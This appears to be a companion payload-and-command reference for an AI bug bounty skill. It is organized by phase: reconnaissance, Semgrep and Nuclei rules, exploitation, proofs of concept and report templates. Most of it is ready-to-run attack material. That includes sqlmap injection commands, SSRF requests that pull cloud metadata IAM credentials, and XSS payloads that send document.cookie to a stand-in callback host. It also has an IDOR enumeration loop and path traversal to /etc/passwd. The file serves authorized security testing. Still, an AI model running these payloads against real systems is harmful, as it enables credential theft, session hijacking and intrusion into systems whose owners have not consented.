# Security Bounty Hunter — Payloads & Commands

> Companion to `SKILL.md`. Contains attack payloads, tool configurations, and command sequences organized by bounty hunting phase.

---

## Quick Start Checklist

```
1. Read scope/policy → 2. Recon surface → 3. Static triage → 4. Manual trace → 5. PoC → 6. Report
```

---

## Phase 1: Reconnaissance Commands

### Subdomain and Asset Discovery

```bash
# Subdomain enumeration
subfinder -d target.com -silent | sort -u

# DNS resolution
cat subdomains.txt | dnsx -silent -a -resp

# HTTP probing
cat resolved.txt | httpx -silent -status-code -title -tech-detect

# Wayback machine URL discovery
cat target.com | waybackurls | sort -u | grep -E "\.(js|json|xml|conf|bak|old)"

# GitHub dorking for secrets
github-dorks -r target-org -o github_results.txt

# Google dorking for exposed files
# site:target.com filetype:log OR filetype:conf OR filetype:bak OR filetype:env
```

### Technology Fingerprinting

```bash
# Web technology detection
whatweb -v https://target.com

# JavaScript file discovery and analysis
cat js_urls.txt | hakrawler -js -depth 2
# Then grep for: API keys, tokens, internal API endpoints, hidden parameters
```

---

## Phase 2: Static Analysis Rules

### Semgrep Custom Rules

```yaml
# Save as bounty-rules.yml
rules:
  # SSRF via user-controlled URL
  - id: bounty-ssrf
    patterns:
      - pattern: |
          requests.get($URL, ...)
      - pattern-inside: |
          def $FUNC(..., $PARAM, ...):
            ...
            $URL = $PARAM
    message: "Potential SSRF — user-controlled URL passed to requests.get"
    severity: ERROR
    languages: [python]

  # SQL injection via string formatting
  - id: bounty-sqli
    patterns:
      - pattern: |
          cursor.execute(f"...{$VAR}...")
    message: "SQL injection via f-string formatting"
    severity: ERROR
    languages: [python]

  # Command injection via subprocess
  - id: bounty-cmdi
    patterns:
      - pattern: |
          subprocess.call($CMD + $INPUT, shell=True)
    message: "Command injection via shell=True with string concatenation"
    severity: ERROR
    languages: [python]
```

```bash
# Run custom rules
semgrep --config=bounty-rules.yml --json target_code/ -o results.json

# Filter for network-reachable findings
cat results.json | jq '.results[] | select(.extra.metadata.category == "security")'
```

### Nuclei Custom Templates

```yaml
# Save as bounty-sqli.yaml
id: bounty-sqli-test

info:
  name: SQL Injection Bounty Test
  author: kali-claw
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}?{{param}}=' OR '1'='1"
      - "{{BaseURL}}/{{path}}?{{param}}=1' AND '1'='1'--"
    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-01756"
          - "PostgreSQL query failed"
        condition: or
```

```bash
nuclei -u https://target.com -t bounty-sqli.yaml -v -o nuclei_results.txt
```

---

## Phase 3: Exploitation Payloads

### SQL Injection Payloads

```bash
# Authentication bypass
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch --level=3 --risk=2

# Union-based extraction
sqlmap -u "https://target.com/api/items?id=1" --union-cols=5-10 --dbs

# Blind boolean-based
sqlmap -u "https://target.com/search?q=test" --technique=B --boolean-test="1=1"
```

### SSRF Payloads

```bash
# Cloud metadata (AWS)
curl -X POST https://target.com/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Cloud metadata (GCP)
curl -X POST https://target.com/api/fetch \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/"}' \
  -H "Metadata-Flavor: Google"

# Internal service discovery
curl -X POST https://target.com/api/fetch \
  -d '{"url":"http://localhost:6379/INFO"}'
```

### XSS Payloads

```bash
# Reflected XSS
curl "https://target.com/search?q=<script>document.location='https://callback.example.com/?c='+document.cookie</script>"

# DOM-based XSS
curl "https://target.com/page#<img/src=x onerror=fetch('https://callback.example.com/?c='+document.cookie)>"

# Stored XSS via user profile
curl -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"bio":"<img src=x onerror=alert(1)>","name":"test"}'
```

### Auth Bypass Payloads

```bash
# IDOR enumeration
for i in $(seq 1 100); do
  curl -s -b "session=$SESSION" "https://target.com/api/users/$i/profile" | grep -q "email" && echo "IDOR: /api/users/$i"
done

# Parameter pollution
curl "https://target.com/api/user?id=123&id=456"

# HTTP method tampering
curl -X PUT "https://target.com/admin/users"
curl -X DELETE "https://target.com/admin/users/1"
```

### Path Traversal Payloads

```bash
# Basic traversal
curl "https://target.com/download?file=../../../etc/passwd"

# Encoding bypass
curl "https://target.com/download?file=..%2f..%2f..%2fetc%2fpasswd"

# Double encoding
curl "https://target.com/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

---

## Phase 4: Burp Suite Configuration

```
1. Proxy → Intercept → Off (passive collection)
2. Target → Site Map → Filter by MIME type (HTML, JSON, JS)
3. Scanner → Active scan → Selected URLs only
4. Intruder → Cluster bomb for parameter fuzzing
5. Logger → Log all requests for evidence
```

### Intruder Parameter Fuzzing List

```
page id user file path url redirect callback next return dest
destination redir redirect_uri redirect_url rurl go target
```

---

## Phase 5: PoC Templates

### Minimal Safe PoC Template

```bash
#!/bin/bash
# PoC: [Vulnerability Type] in [Component]
# Severity: [Critical/High/Medium/Low]
# Date: $(date +%Y-%m-%d)

TARGET="https://target.com"
echo "[*] Testing [vulnerability]..."
RESPONSE=$(curl -s -i "$TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"param":"PAYLOAD"}')

echo "[*] Response:"
echo "$RESPONSE"

if echo "$RESPONSE" | grep -q "EXPECTED_INDICATOR"; then
  echo "[+] VULNERABLE: [description]"
else
  echo "[-] Not vulnerable"
fi
```

### Evidence Collection

```bash
# Capture full request/response with timestamps
curl -v -s -i "$TARGET/api/endpoint" \
  -H "X-Custom: payload" \
  -d '{"data":"test"}' \
  -o evidence_$(date +%Y%m%d_%H%M%S).txt 2>&1
```

---

## Phase 6: Report Templates

### Critical Severity Finding Template

```markdown
## [CVE-TBD] Remote Code Execution via [Component]

**Severity**: Critical (CVSS 9.8)
**Component**: /api/v1/process (handler.py:42-67)
**Authentication**: None required

### Description
[What the vulnerability is and why it matters]

### Proof of Concept
```bash
curl -X POST https://target.com/api/v1/process \
  -H "Content-Type: application/json" \
  -d '{"command":"id"}'
# Response: uid=33(www-data) gid=33(www-data)
```

### Impact
Unauthenticated RCE enabling full system compromise.

### Remediation
1. Remove shell=True from subprocess calls
2. Implement strict input validation with allowlist
```

### High Severity Finding (IDOR) Template

```markdown
## Insecure Direct Object Reference in User API

**Severity**: High (CVSS 7.5)
**Component**: /api/v1/users/{id}/profile

### Proof of Concept
```bash
curl -H "Authorization: Bearer $USER_A_TOKEN" \
  https://target.com/api/v1/users/456/profile
# Returns User B's full profile data
```

### Remediation
1. Verify requesting_user.id == requested_user.id
2. Implement object-level authorization middleware
```
